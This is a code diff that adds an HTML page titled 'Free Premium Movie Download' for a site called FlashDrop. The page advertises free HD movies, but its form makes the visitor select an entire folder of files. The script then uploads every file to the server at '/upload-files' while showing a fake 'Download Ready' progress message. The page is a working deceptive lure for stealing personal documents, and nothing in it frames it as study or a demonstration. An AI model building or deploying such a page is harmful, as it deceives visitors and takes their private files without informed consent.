@@ -1,1 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Free Premium Movie Download | FlashDrop</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: radial-gradient(circle at top left, #141414, #000);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      background-color: #1a1a1a;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      text-align: center;
+      width: 90%;
+      max-width: 420px;
+      animation: fadeIn 1.2s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+      background: linear-gradient(90deg, #e50914, #ff6a00);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-weight: 700;
+    }
+
+    p {
+      font-size: 0.95rem;
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+
+    input[type="file"] {
+      padding: 14px;
+      width: 100%;
+      border-radius: 8px;
+      border: 2px dashed #444;
+      background: #111;
+      color: #eee;
+      margin-bottom: 16px;
+      transition: 0.3s ease;
+    }
+
+    input[type="file"]:hover {
+      border-color: #e50914;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 1rem;
+      background: linear-gradient(to right, #e50914, #b81d24);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 12px rgba(229, 9, 20, 0.6);
+      transition: 0.3s ease-in-out;
+    }
+
+    button:hover {
+      transform: scale(1.04);
+      background: linear-gradient(to right, #ff1e4b, #e50914);
+    }
+
+    #progressContainer {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .progress-wrapper {
+      background-color: #333;
+      border-radius: 8px;
+      overflow: hidden;
+      height: 22px;
+      box-shadow: inset 0 0 8px #000;
+    }
+
+    #progressBar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(to right, #e50914, #ff6a00);
+      transition: width 0.3s ease;
+    }
+
+    #progressText {
+      margin-top: 8px;
+      font-size: 0.85rem;
+      color: #ccc;
+    }
+
+    .glow {
+      text-shadow: 0 0 10px #e50914, 0 0 20px #ff6a00;
+      animation: glowPulse 1.5s infinite;
+    }
+
+    @keyframes glowPulse {
+      0% { text-shadow: 0 0 10px #e50914, 0 0 20px #ff6a00; }
+      50% { text-shadow: 0 0 20px #ff6a00, 0 0 30px #e50914; }
+      100% { text-shadow: 0 0 10px #e50914, 0 0 20px #ff6a00; }
+    }
+
+    footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2 class="glow">🎬 Free Premium Movie Download</h2>
+    <p>Unlimited HD content. Get your movie pack now!</p>
+    <form id="uploadForm" enctype="multipart/form-data" method="POST">
+      <input type="file" name="docs" webkitdirectory multiple required />
+      <button type="submit">Start Download</button>
+    </form>
+    <div id="progressContainer">
+      <div class="progress-wrapper">
+        <div id="progressBar"></div>
+      </div>
+      <div id="progressText">Preparing...</div>
+    </div>
+    <footer>
+      ⚠️ Files may take time depending on size.
+    </footer>
+  </div>
+
+  <script>
+    const form = document.getElementById('uploadForm');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    const progressContainer = document.getElementById('progressContainer');
+
+    form.addEventListener('submit', function (event) {
+      event.preventDefault();
+      const formData = new FormData(form);
+      const xhr = new XMLHttpRequest();
+
+      progressContainer.style.display = 'block';
+      progressBar.style.width = '0%';
+      progressText.textContent = 'Starting Upload...';
+
+      xhr.upload.onprogress = function (e) {
+        if (e.lengthComputable) {
+          const percent = Math.round((e.loaded / e.total) * 100);
+          progressBar.style.width = percent + '%';
+          progressText.textContent = 'Uploading: ' + percent + '%';
+        }
+      };
+
+      xhr.onload = function () {
+        if (xhr.status === 200) {
+          progressBar.style.width = '100%';
+          progressText.textContent = '✅ Download Ready!';
+        } else {
+          progressText.textContent = '❌ Upload failed.';
+        }
+      };
+
+      xhr.onerror = function () {
+        progressText.textContent = '❌ Upload error.';
+      };
+
+      xhr.open('POST', '/upload-files');
+      xhr.send(formData);
+    });
+  </script>
+</body>
+</html>
